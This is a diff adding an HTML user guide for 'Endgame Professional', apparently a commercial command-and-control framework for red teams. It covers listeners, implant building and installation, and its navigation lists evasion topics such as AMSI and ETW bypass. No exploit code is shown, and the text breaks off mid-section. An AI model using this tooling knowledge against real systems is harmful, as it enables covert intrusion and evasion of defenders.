@@ -1,0 +1,1054 @@
+<title>Endgame Professional — User Guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+:root {
+  --bg:        #0b0d11;
+  --surface:   #13161c;
+  --surface2:  #1a1e27;
+  --surface3:  #222633;
+  --border:    #252a35;
+  --text:      #e2e6f0;
+  --text2:     #8a94a8;
+  --text3:     #4a5568;
+  --accent:    #c8102e;
+  --accent-lo: rgba(200,16,46,.12);
+  --accent-md: rgba(200,16,46,.25);
+  --green:     #22c55e;
+  --yellow:    #f59e0b;
+  --blue:      #60a5fa;
+  --purple:    #a78bfa;
+  --sidebar-w: 258px;
+  --hdr-h:     52px;
+  --font:      'Inter', system-ui, sans-serif;
+  --mono:      'JetBrains Mono', 'Fira Code', monospace;
+}
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg:      #f4f5f8;
+    --surface: #ffffff;
+    --surface2:#f0f2f6;
+    --surface3:#e8eaf0;
+    --border:  #dde1eb;
+    --text:    #111827;
+    --text2:   #4b5563;
+    --text3:   #9ca3af;
+  }
+}
+:root[data-theme="light"] {
+  --bg:      #f4f5f8;
+  --surface: #ffffff;
+  --surface2:#f0f2f6;
+  --surface3:#e8eaf0;
+  --border:  #dde1eb;
+  --text:    #111827;
+  --text2:   #4b5563;
+  --text3:   #9ca3af;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;font-family:var(--font);background:var(--bg);color:var(--text);font-size:14px;line-height:1.6}
+
+/* ── HEADER ── */
+#hdr{position:fixed;top:0;left:0;right:0;height:var(--hdr-h);background:var(--surface);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:16px;padding:0 20px;z-index:100}
+#hdr .logo{display:flex;align-items:center;gap:10px;text-decoration:none}
+#hdr .logo-mark{width:28px;height:28px;background:var(--accent);border-radius:5px;display:grid;place-items:center;font-size:14px;font-weight:700;color:#fff;letter-spacing:-.5px}
+#hdr .logo-text{font-size:13px;font-weight:600;color:var(--text);letter-spacing:.2px}
+#hdr .logo-text span{color:var(--accent)}
+#hdr .badge{font-size:10px;font-weight:700;background:var(--accent-lo);color:var(--accent);border:1px solid var(--accent-md);border-radius:4px;padding:2px 7px;letter-spacing:.5px}
+#hdr .spacer{flex:1}
+#hdr .search{display:flex;align-items:center;gap:8px;background:var(--surface2);border:1px solid var(--border);border-radius:7px;padding:6px 12px;width:240px;cursor:text}
+#hdr .search input{background:none;border:none;outline:none;color:var(--text);font:inherit;font-size:13px;width:100%;caret-color:var(--accent)}
+#hdr .search input::placeholder{color:var(--text3)}
+#hdr .search-icon{color:var(--text3);font-size:13px}
+#theme-btn{background:none;border:1px solid var(--border);border-radius:6px;color:var(--text2);cursor:pointer;padding:6px 10px;font-size:13px;font-family:var(--font)}
+#theme-btn:hover{border-color:var(--accent);color:var(--accent)}
+.hdr-link{font-size:12px;color:var(--text2);text-decoration:none;padding:5px 10px;border-radius:5px}
+.hdr-link:hover{color:var(--text);background:var(--surface2)}
+.ver-pill{font-size:10px;background:var(--surface2);border:1px solid var(--border);border-radius:99px;padding:2px 8px;color:var(--text3)}
+
+/* ── SIDEBAR ── */
+#sidebar{position:fixed;top:var(--hdr-h);left:0;bottom:0;width:var(--sidebar-w);background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;overflow-x:hidden;padding-bottom:32px}
+#sidebar::-webkit-scrollbar{width:4px}
+#sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+.nav-section{margin-top:4px}
+.nav-section-hdr{padding:16px 20px 6px;font-size:10px;font-weight:700;letter-spacing:1.2px;color:var(--text3);text-transform:uppercase;display:flex;align-items:center;justify-content:space-between;cursor:pointer;user-select:none}
+.nav-section-hdr:hover{color:var(--text2)}
+.nav-section-hdr .chev{font-size:9px;transition:transform .2s}
+.nav-section.collapsed .chev{transform:rotate(-90deg)}
+.nav-section.collapsed .nav-items{display:none}
+.nav-items{}
+.nav-item{display:block;padding:7px 20px;font-size:13px;color:var(--text2);text-decoration:none;cursor:pointer;transition:background .1s,color .1s;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent}
+.nav-item:hover{color:var(--text);background:var(--surface2)}
+.nav-item.active{color:var(--accent);background:var(--accent-lo);border-left-color:var(--accent);font-weight:500}
+.nav-item.sub{padding-left:32px;font-size:12px}
+.nav-divider{height:1px;background:var(--border);margin:8px 16px}
+
+/* ── MAIN ── */
+#main{margin-left:var(--sidebar-w);margin-top:var(--hdr-h);min-height:calc(100% - var(--hdr-h));padding:48px 56px 80px}
+.topic{display:none;max-width:820px}
+.topic.active{display:block}
+
+/* ── CONTENT TYPOGRAPHY ── */
+.topic h1{font-size:28px;font-weight:700;color:var(--text);margin-bottom:8px;text-wrap:balance;letter-spacing:-.4px}
+.topic .eyebrow{font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--accent);margin-bottom:12px}
+.topic .lead{font-size:16px;color:var(--text2);line-height:1.7;margin-bottom:32px;max-width:640px}
+.topic h2{font-size:18px;font-weight:600;color:var(--text);margin:36px 0 12px;letter-spacing:-.2px;padding-top:4px}
+.topic h3{font-size:14px;font-weight:600;color:var(--text);margin:24px 0 8px;text-transform:uppercase;letter-spacing:.6px}
+.topic p{color:var(--text2);margin-bottom:14px;max-width:680px}
+.topic ul,.topic ol{color:var(--text2);padding-left:20px;margin-bottom:14px;max-width:680px}
+.topic li{margin-bottom:5px}
+.topic strong{color:var(--text);font-weight:600}
+.topic code{font-family:var(--mono);font-size:12px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:1px 6px;color:#93c5fd}
+.topic a{color:var(--accent);text-decoration:none}
+.topic a:hover{text-decoration:underline}
+
+/* ── CALLOUTS ── */
+.callout{border-radius:8px;padding:14px 16px;margin:20px 0;display:flex;gap:12px;align-items:flex-start;max-width:680px}
+.callout.info{background:rgba(96,165,250,.1);border:1px solid rgba(96,165,250,.25)}
+.callout.warn{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.25)}
+.callout.tip{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25)}
+.callout-icon{font-size:15px;margin-top:1px;flex-shrink:0}
+.callout-body{font-size:13px;color:var(--text2);line-height:1.6}
+.callout-body strong{color:var(--text)}
+
+/* ── CODE BLOCKS ── */
+.code-block{background:var(--surface2);border:1px solid var(--border);border-radius:8px;margin:16px 0 24px;overflow:hidden;max-width:720px}
+.code-block-hdr{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;border-bottom:1px solid var(--border)}
+.code-block-lang{font-size:10px;font-weight:600;letter-spacing:.8px;text-transform:uppercase;color:var(--text3)}
+.code-block-copy{font-size:11px;color:var(--text3);cursor:pointer;background:none;border:none;font-family:var(--font);padding:2px 6px;border-radius:4px}
+.code-block-copy:hover{color:var(--text2);background:var(--surface3)}
+.code-block pre{padding:16px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.7;color:#c9d1d9}
+.code-block pre .k{color:#ff7b72}
+.code-block pre .s{color:#a5d6ff}
+.code-block pre .c{color:#6e7681}
+.code-block pre .n{color:#79c0ff}
+.code-block pre .p{color:#c9d1d9}
+.code-block pre .m{color:#f2cc60}
+
+/* ── SCREENSHOTS ── */
+.screenshot{border-radius:10px;overflow:hidden;border:1px solid var(--border);margin:24px 0 32px;box-shadow:0 8px 32px rgba(0,0,0,.4);max-width:720px}
+.screenshot-caption{font-size:12px;color:var(--text3);margin-top:-20px;margin-bottom:28px;padding-left:2px}
+
+/* ── FAKE APP UI (screenshot mockups) ── */
+.app-chrome{background:#0b0d11;font-family:var(--mono)}
+.app-titlebar{background:#13161c;border-bottom:1px solid #252a35;padding:8px 14px;display:flex;align-items:center;gap:8px}
+.app-titlebar .dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.dot-r{background:#ff5f57}.dot-y{background:#ffbd2e}.dot-g{background:#28c840}
+.app-titlebar .title{font-size:11px;color:#555f6e;margin-left:6px;font-family:var(--font)}
+.app-tabs{display:flex;background:#13161c;border-bottom:1px solid #252a35;padding:0 14px;gap:2px}
+.app-tab{font-size:11px;font-family:var(--font);padding:8px 14px;color:#555f6e;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap}
+.app-tab.on{color:#e2e6f0;border-bottom-color:#c8102e}
+.app-body{background:#0b0d11;padding:0}
+.app-toolbar{display:flex;align-items:center;gap:8px;padding:8px 14px;border-bottom:1px solid #252a35;background:#13161c}
+.app-toolbar .tbtn{font-size:11px;font-family:var(--font);padding:4px 10px;border-radius:5px;border:1px solid #252a35;background:#1a1e27;color:#8a94a8;cursor:pointer;white-space:nowrap}
+.app-toolbar .tbtn.primary{border-color:#c8102e;color:#c8102e;background:rgba(200,16,46,.1)}
+.app-toolbar .sep{width:1px;height:18px;background:#252a35;margin:0 4px}
+.app-toolbar .spacer{flex:1}
+.app-toolbar .filter{font-size:11px;font-family:var(--font);background:#1a1e27;border:1px solid #252a35;border-radius:5px;padding:4px 10px;color:#8a94a8;width:160px}
+.app-table{width:100%;border-collapse:collapse;font-size:11px;font-family:var(--font)}
+.app-table th{padding:7px 12px;text-align:left;color:#4a5568;font-weight:600;font-size:10px;letter-spacing:.6px;text-transform:uppercase;border-bottom:1px solid #252a35;background:#13161c}
+.app-table td{padding:8px 12px;color:#8a94a8;border-bottom:1px solid #1a1e27;vertical-align:middle}
+.app-table tr:hover td{background:#13161c;color:#e2e6f0}
+.app-table .host{color:#e2e6f0;font-weight:500}
+.app-table .id{color:#c8102e;font-family:var(--mono);font-size:10px}
+.pill{display:inline-block;font-size:9px;font-weight:700;padding:1px 6px;border-radius:3px;letter-spacing:.4px;text-transform:uppercase}
+.pill-http{background:rgba(245,158,11,.18);color:#f59e0b}
+.pill-https{background:rgba(74,222,128,.18);color:#4ade80}
+.pill-mtls{background:rgba(96,165,250,.18);color:#60a5fa}
+.pill-quic{background:rgba(52,211,153,.18);color:#34d399}
+.pill-smb{background:rgba(167,139,250,.18);color:#a78bfa}
+.pill-live{background:rgba(34,197,94,.18);color:#22c55e}
+.pill-dead{background:rgba(107,114,128,.18);color:#6b7280}
+.status-dot{width:7px;height:7px;border-radius:50%;display:inline-block;margin-right:4px}
+.dot-live{background:#22c55e;box-shadow:0 0 6px #22c55e88}
+.dot-dead{background:#4a5568}
+.app-console{background:#060709;padding:14px;font-family:var(--mono);font-size:11px;line-height:1.7;min-height:100px}
+.cons-prompt{color:#c8102e}
+.cons-cmd{color:#e2e6f0}
+.cons-out{color:#8a94a8}
+.cons-ok{color:#22c55e}
+.cons-warn{color:#f59e0b}
+.app-panel{background:#13161c;border-right:1px solid #252a35;width:220px;flex-shrink:0}
+.app-panel-hdr{padding:10px 14px;font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:#4a5568;border-bottom:1px solid #252a35}
+.app-panel-item{padding:8px 14px;font-size:11px;color:#8a94a8;cursor:pointer;font-family:var(--font);display:flex;align-items:center;gap:8px;border-left:2px solid transparent}
+.app-panel-item.sel{color:#e2e6f0;background:#1a1e27;border-left-color:#c8102e}
+.app-panel-item:hover{background:#1a1e27;color:#e2e6f0}
+.app-flex{display:flex}
+
+/* ── TABLES (content) ── */
+.tbl{width:100%;border-collapse:collapse;margin:16px 0 24px;font-size:13px;max-width:720px}
+.tbl th{text-align:left;padding:9px 14px;font-size:11px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;color:var(--text3);border-bottom:2px solid var(--border)}
+.tbl td{padding:10px 14px;color:var(--text2);border-bottom:1px solid var(--border);vertical-align:top}
+.tbl td:first-child{color:var(--text);font-family:var(--mono);font-size:12px}
+.tbl tr:last-child td{border-bottom:none}
+
+/* ── TAGS ── */
+.tag{display:inline-block;font-size:10px;font-weight:600;padding:2px 7px;border-radius:4px;letter-spacing:.3px;margin-right:4px}
+.tag-new{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3)}
+.tag-win{background:rgba(96,165,250,.15);color:#60a5fa;border:1px solid rgba(96,165,250,.3)}
+.tag-adv{background:rgba(200,16,46,.15);color:#c8102e;border:1px solid rgba(200,16,46,.3)}
+
+/* ── STEPS ── */
+.steps{counter-reset:step;margin:16px 0 24px;max-width:640px}
+.step{display:flex;gap:16px;margin-bottom:20px;align-items:flex-start}
+.step::before{counter-increment:step;content:counter(step);width:26px;height:26px;background:var(--accent);color:#fff;font-weight:700;font-size:12px;border-radius:50%;display:grid;place-items:center;flex-shrink:0;margin-top:2px}
+.step-body{flex:1}
+.step-body strong{display:block;color:var(--text);margin-bottom:4px;font-size:13px}
+.step-body p{color:var(--text2);font-size:13px;margin:0}
+
+/* ── FOOTER ── */
+#footer{margin-left:var(--sidebar-w);padding:32px 56px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-size:12px;color:var(--text3)}
+#footer a{color:var(--text3);text-decoration:none}
+#footer a:hover{color:var(--accent)}
+
+/* ── SEARCH OVERLAY ── */
+#search-overlay{display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.7);backdrop-filter:blur(4px)}
+#search-overlay.on{display:flex;align-items:flex-start;justify-content:center;padding-top:15vh}
+#search-box{background:var(--surface);border:1px solid var(--border);border-radius:12px;width:560px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.5)}
+#search-input{width:100%;padding:16px 20px;background:none;border:none;outline:none;font:500 16px var(--font);color:var(--text);border-bottom:1px solid var(--border);caret-color:var(--accent)}
+#search-input::placeholder{color:var(--text3)}
+.search-results{padding:8px 0 12px;max-height:380px;overflow-y:auto}
+.search-result{padding:10px 20px;cursor:pointer;display:flex;flex-direction:column;gap:3px}
+.search-result:hover{background:var(--surface2)}
+.search-result .sr-section{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}
+.search-result .sr-title{font-size:13px;color:var(--text);font-weight:500}
+.search-result .sr-snippet{font-size:12px;color:var(--text2)}
+.search-empty{padding:20px;text-align:center;color:var(--text3);font-size:13px}
+
+@media (max-width:800px){
+  :root{--sidebar-w:0px}
+  #sidebar{transform:translateX(-260px);transition:transform .25s;width:260px;z-index:90}
+  #sidebar.open{transform:translateX(0)}
+  #main{margin-left:0;padding:24px 20px 60px}
+  #footer{margin-left:0;padding:24px 20px}
+  #hdr{padding:0 14px}
+  #hdr .search{display:none}
+  #menu-btn{display:block}
+  .topic h1{font-size:22px}
+}
+#menu-btn{display:none;background:none;border:none;color:var(--text2);cursor:pointer;font-size:18px;padding:4px}
+</style>
+
+<!-- HEADER -->
+<header id="hdr">
+  <button id="menu-btn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+  <a class="logo" href="https://endgamec2framework.com/professional.html">
+    <div class="logo-mark">E</div>
+    <div class="logo-text"><span>Endgame</span> Professional</div>
+  </a>
+  <span class="badge">PROFESSIONAL</span>
+  <span class="ver-pill">v2.1</span>
+  <div class="spacer"></div>
+  <div class="search" onclick="openSearch()">
+    <span class="search-icon">⌕</span>
+    <input id="hdr-search" placeholder="Search docs… (⌘K)" readonly>
+  </div>
+  <a class="hdr-link" href="https://endgamec2framework.com/professional.html">← Professional</a>
+  <button id="theme-btn" onclick="toggleTheme()">◐</button>
+</header>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Introduction <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item active" onclick="show('welcome')">Welcome</a>
+      <a class="nav-item" onclick="show('whats-new')">What's New in v2.1 <span class="tag tag-new">NEW</span></a>
+      <a class="nav-item" onclick="show('architecture')">Architecture Overview</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Getting Started <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('install')">Installation</a>
+      <a class="nav-item" onclick="show('profiles')">Operator Profiles</a>
+      <a class="nav-item" onclick="show('first-launch')">First Launch</a>
+      <a class="nav-item" onclick="show('licensing')">Licensing</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Listeners <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('listeners-overview')">Overview</a>
+      <a class="nav-item sub" onclick="show('listener-http')">HTTP</a>
+      <a class="nav-item sub" onclick="show('listener-https')">HTTPS</a>
+      <a class="nav-item sub" onclick="show('listener-mtls')">mTLS</a>
+      <a class="nav-item sub" onclick="show('listener-tcp')">TCP</a>
+      <a class="nav-item sub" onclick="show('listener-smb')">SMB Named Pipe</a>
+      <a class="nav-item sub" onclick="show('listener-quic')">QUIC / HTTP3 <span class="tag tag-new">NEW</span></a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Agents <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('agents-overview')">Agent Overview</a>
+      <a class="nav-item sub" onclick="show('agent-go')">Go Agent (Windows)</a>
+      <a class="nav-item sub" onclick="show('agent-nim')">Nim Agent (Windows)</a>
+      <a class="nav-item" onclick="show('payload-builder')">Payload Builder</a>
+      <a class="nav-item" onclick="show('agent-lifecycle')">Agent Lifecycle</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Commands <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('commands-overview')">Command Reference</a>
+      <a class="nav-item sub" onclick="show('cmd-shell')">Shell & PowerShell</a>
+      <a class="nav-item sub" onclick="show('cmd-files')">File Operations</a>
+      <a class="nav-item sub" onclick="show('cmd-process')">Process & Injection</a>
+      <a class="nav-item sub" onclick="show('cmd-lateral')">Lateral Movement</a>
+      <a class="nav-item sub" onclick="show('cmd-persistence')">Persistence</a>
+      <a class="nav-item sub" onclick="show('cmd-privesc')">Privilege Escalation</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Evasion & OPSEC <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('evasion-overview')">Overview</a>
+      <a class="nav-item sub" onclick="show('sleep-mask')">Sleep Mask</a>
+      <a class="nav-item sub" onclick="show('injection-methods')">Injection Methods</a>
+      <a class="nav-item sub" onclick="show('etw-bypass')">ETW Bypass</a>
+      <a class="nav-item sub" onclick="show('amsi-bypass')">AMSI Bypass</a>
+      <a class="nav-item sub" onclick="show('eaf-bypass')">EAF Bypass</a>
+      <a class="nav-item sub" onclick="show('obf-pipeline')">Obfuscation Pipeline</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">BOF <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('bof-overview')">Beacon Object Files</a>
+      <a class="nav-item sub" onclick="show('bof-install')">Installing BOFs</a>
+      <a class="nav-item sub" onclick="show('bof-run')">Running BOFs</a>
+      <a class="nav-item sub" onclick="show('bof-write')">Writing BOFs</a>
+      <a class="nav-item sub" onclick="show('bof-async')">Async BOF Execution</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Covert Channels <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('udc2')">UDC2 Transport</a>
+      <a class="nav-item" onclick="show('quic-channel')">QUIC & Fallback <span class="tag tag-new">NEW</span></a>
+      <a class="nav-item" onclick="show('smb-pivot')">SMB Pivot</a>
+      <a class="nav-item" onclick="show('malleable-c2')">Malleable C2</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Team Operations <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('peer-federation')">Peer Federation</a>
+      <a class="nav-item" onclick="show('scripted-delivery')">Scripted Delivery</a>
+      <a class="nav-item" onclick="show('reporting')">Reporting</a>
+    </div>
+  </div>
+  <div class="nav-divider"></div>
+  <div class="nav-section">
+    <div class="nav-section-hdr" onclick="toggleSection(this)">Reference <span class="chev">▾</span></div>
+    <div class="nav-items">
+      <a class="nav-item" onclick="show('api-ref')">Operator API</a>
+      <a class="nav-item" onclick="show('task-types')">Task Type Reference</a>
+      <a class="nav-item" onclick="show('transport-ref')">Transport Reference</a>
+    </div>
+  </div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<main id="main">
+
+<!-- WELCOME -->
+<section class="topic active" id="t-welcome">
+  <div class="eyebrow">Introduction</div>
+  <h1>Welcome to Endgame Professional</h1>
+  <p class="lead">A full-spectrum command and control framework engineered for professional red team operations — built for operational security, team scale, and modern adversary simulation.</p>
+
+  <div class="screenshot">
+    <div class="app-chrome">
+      <div class="app-titlebar"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div><div class="title">Endgame Professional — Agents</div></div>
+      <div class="app-tabs"><div class="app-tab on">Agents</div><div class="app-tab">Listeners</div><div class="app-tab">Credentials</div><div class="app-tab">Files</div><div class="app-tab">Tasks</div><div class="app-tab">Logs</div></div>
+      <div class="app-toolbar">
+        <button class="tbtn primary">+ New Listener</button>
+        <button class="tbtn">Build Payload</button>
+        <div class="sep"></div>
+        <button class="tbtn">Bulk Task</button>
+        <div class="spacer"></div>
+        <input class="filter" placeholder="Filter agents…">
+      </div>
+      <table class="app-table">
+        <tr><th>ID</th><th>Hostname</th><th>User</th><th>OS</th><th>Transport</th><th>Sleep</th><th>Last seen</th><th>Status</th></tr>
+        <tr><td class="id">1eb64181</td><td class="host">castelblack</td><td>Administrator</td><td>win64</td><td><span class="pill pill-mtls">mTLS</span></td><td>60s±20%</td><td>2s ago</td><td><span class="status-dot dot-live"></span><span class="pill pill-live">Live</span></td></tr>
+        <tr><td class="id">8d020bc8</td><td class="host">castelblack</td><td>NORTH\jon.snow</td><td>win64</td><td><span class="pill pill-quic">QUIC</span></td><td>45s±10%</td><td>8s ago</td><td><span class="status-dot dot-live"></span><span class="pill pill-live">Live</span></td></tr>
+        <tr><td class="id">be68d09c</td><td class="host">winterfell</td><td>Administrator</td><td>win64</td><td><span class="pill pill-smb">SMB</span></td><td>30s±5%</td><td>12s ago</td><td><span class="status-dot dot-live"></span><span class="pill pill-live">Live</span></td></tr>
+        <tr><td class="id">a3cf70b6</td><td class="host">castelblack</td><td>localuser</td><td>win64</td><td><span class="pill pill-https">QUIC→HTTPS</span></td><td>30s±0%</td><td>44s ago</td><td><span class="status-dot dot-live"></span><span class="pill pill-live">Live</span></td></tr>
+      </table>
+    </div>
+  </div>
+  <p class="screenshot-caption">Figure 1 — Agent management panel showing active implants across multiple transports</p>
+
+  <h2>Overview</h2>
+  <p>Endgame Professional is a mature C2 framework designed for red teams that need deep OPSEC controls, multi-operator collaboration, and evasion capabilities that keep pace with modern EDR/XDR solutions. It ships with a built-in operator GUI, a full REST API, and a rich library of built-in techniques.</p>
+  <p>The framework is organized around four core concepts:</p>
+  <ul>
+    <li><strong>Listeners</strong> — server-side inbound handlers (HTTP, HTTPS, mTLS, TCP, SMB, QUIC)</li>
+    <li><strong>Agents</strong> — in-memory implants deployed on target systems</li>
+    <li><strong>Tasks</strong> — commands dispatched to agents and executed asynchronously</li>
+    <li><strong>Operators</strong> — team members with mTLS-authenticated access to the teamserver</li>
+  </ul>
+
+  <h2>Where to begin</h2>
+  <div class="steps">
+    <div class="step"><div class="step-body"><strong>Run the installer</strong><p>Execute <code>./install.sh</code> on your Linux C2 server. It installs all dependencies, builds the binaries, generates TLS certificates and your first operator profile.</p></div></div>
+    <div class="step"><div class="step-body"><strong>Connect as an operator</strong><p>Use <code>c2-client -name admin</code> on the same host, or tunnel the operator port over SSH from your workstation.</p></div></div>
+    <div class="step"><div class="step-body"><strong>Create a listener</strong><p>Open <strong>Listeners → + New Listener</strong>, pick a protocol and port, and start it.</p></div></div>
+    <div class="step"><div class="step-body"><strong>Build and deploy a payload</strong><p>Open <strong>Payload Builder</strong>, configure your listener and OPSEC options, and download the compiled EXE.</p></div></div>
+  </div>
+</section>
+
+<!-- WHAT'S NEW -->
+<section class="topic" id="t-whats-new">
+  <div class="eyebrow">Introduction</div>
+  <h1>What's New in v2.1</h1>
+  <p class="lead">Version 2.1 closes the remaining feature gaps with Cobalt Strike 4.11 and introduces several capabilities CS doesn't offer.</p>
+  <h2>New in this release</h2>
+  <table class="tbl">
+    <tr><th>Feature</th><th>Description</th><th></th></tr>
+    <tr><td>QUIC / HTTP3 transport</td><td>Beacon over UDP/QUIC — evades TCP-based IDS signatures. Automatic fallback to HTTPS if UDP is blocked.</td><td><span class="tag tag-new">NEW</span></td></tr>
+    <tr><td>QUIC → HTTPS fallback</td><td>After 3 consecutive QUIC failures the agent switches permanently to HTTPS and reports <code>quic→https</code> transport.</td><td><span class="tag tag-new">NEW</span></td></tr>
+    <tr><td>UDC2 Transport</td><td>Load a custom C2 transport BOF at runtime via <code>UDC2_LOAD</code> — any protocol, any channel, hot-swappable.</td><td><span class="tag tag-new">NEW</span></td></tr>
+    <tr><td>Obfuscation Pipeline</td><td>Ordered encode chain (sgn/xor/zlib/b64/aes) applied at build time; agent decodes in reverse at runtime.</td><td><span class="tag tag-new">NEW</span></td></tr>
+    <tr><td>Malleable C2 live push</td><td>Update a running agent's HTTP profile (user-agent, beacon URIs, headers) without redeployment.</td><td><span class="tag tag-new">NEW</span></td></tr>
+    <tr><td>Peer Federation</td><td>Link multiple Endgame teamservers — peer agents appear in your UI with a 🔗 badge and shared credential store.</td><td><span class="tag tag-new">NEW</span></td></tr>
+    <tr><td>Scripted Delivery hit tracking</td><td>Every victim fetch of a hosted payload is logged (IP, UA, timestamp). Green "▸ N hits" badge in the UI.</td><td><span class="tag tag-new">NEW</span></td></tr>
+    <tr><td>Async BOF execution</td><td>Long-running BOFs run in a goroutine — the agent ACKs immediately and sends the result when ready.</td><td><span class="tag tag-new">NEW</span></td></tr>
+  </table>
+</section>
+
+<!-- INSTALL -->
+<section class="topic" id="t-install">
+  <div class="eyebrow">Getting Started</div>
+  <h1>Installation</h1>
+  <p class="lead">The installer handles all system dependencies, Go toolchain, certificate generation, and first operator profile creation in a single script.</p>
+  <h2>Requirements</h2>
+  <ul>
+    <li>Debian/Ubuntu or Kali Linux (x86-64)</li>
+    <li>Internet access for initial dependency download</li>
+    <li>Root or sudo privileges</li>
+    <li>License key (contact for access)</li>
+  </ul>
+  <div class="callout info"><span class="callout-icon">ℹ</span><div class="callout-body"><strong>VPS recommendation</strong> — deploy the server on a cloud instance with a public IP. Operators connect via SSH tunnel to the loopback operator API port (default <code>31337</code>).</div></div>
+  <h2>Run the installer</h2>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>git clone git@github.com:endgamec2framework/endgameProfessional.git
+cd endgameProfessional
+./install.sh</pre>
+  </div>
+  <p>The installer performs these steps automatically:</p>
+  <ol>
+    <li>Installs system packages (git, gcc, mingw, nasm, nmap, impacket, metasploit…)</li>
+    <li>Installs Go ≥ 1.22, garble, nim + nimble packages</li>
+    <li>Builds <code>bin/c2-server</code> and <code>bin/c2-client</code></li>
+    <li>Builds a default Windows agent (<code>bin/agent.exe</code>)</li>
+    <li>Generates TLS certificates in <code>certs/</code></li>
+    <li>Creates operator profiles in <code>~/.endgame/profiles/</code></li>
+    <li>Downloads SharpCollection .NET tools into <code>data/uploads/</code></li>
+  </ol>
+  <h2>Start the server</h2>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>./bin/c2-server \
+  -http-port 80 \
+  -https-port 443 \
+  -mtls-port 8443 \
+  -operator-port 31337 \
+  -quic-port 8444 \
+  -db data/c2.db \
+  -certs certs \
+  -data data</pre>
+  </div>
+  <h2>Connect as operator</h2>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">bash</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre># On your local workstation — tunnel the operator port first
+ssh -L 31337:127.0.0.1:31337 user@your-c2-server
+
+# Then connect
+c2-client -name admin -gui-port 9999 -gui-only
+# Open http://127.0.0.1:9999 in your browser</pre>
+  </div>
+</section>
+
+<!-- PROFILES -->
+<section class="topic" id="t-profiles">
+  <div class="eyebrow">Getting Started</div>
+  <h1>Operator Profiles</h1>
+  <p class="lead">Every operator authenticates to the teamserver using a mutual-TLS client certificate stored in a JSON profile file.</p>
+  <h2>Profile format</h2>
+  <div class="code-block">
+    <div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
+    <pre>{
+  "name":            "alice",
+  "server":          "127.0.0.1:31337",
+  "ca_cert_pem":     "-----BEGIN CERTIFICATE-----\n...",
+  "client_cert_pem": "-----BEGIN CERTIFICATE-----\n...",
+  "client_key_pem":  "-----BEGIN EC PRIVATE KEY-----\n..."
+}</pre>
+  </div>
+  <h2>Creating a new operator</h2>
+  <p>Run this on the C2 server (where the CA key lives):</p>
+  <div class="code-block">
